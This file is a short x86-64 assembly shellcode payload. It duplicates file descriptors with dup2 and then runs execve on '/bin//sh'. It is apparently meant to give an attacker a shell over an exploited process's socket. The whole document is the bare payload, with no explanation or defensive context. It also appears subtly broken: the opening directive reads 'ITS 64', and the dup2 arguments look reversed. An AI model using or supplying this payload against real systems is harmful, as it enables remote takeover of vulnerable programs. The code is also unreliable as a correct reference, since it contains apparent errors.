ITS 64

global _start

section .text

_start:
        xor rax, rax
        mov rdi, rax
        mov rsi, rax
        mov al, 33
        mov sil, 4
        syscall

        inc rdi
        syscall

        xor rax, rax
        push rax
        xor rdx, rdx
        xor rsi, rsi
        mov rbx,'/bin//sh'
        push rbx
        push rsp
        pop rdi
        mov al, 59
        syscall
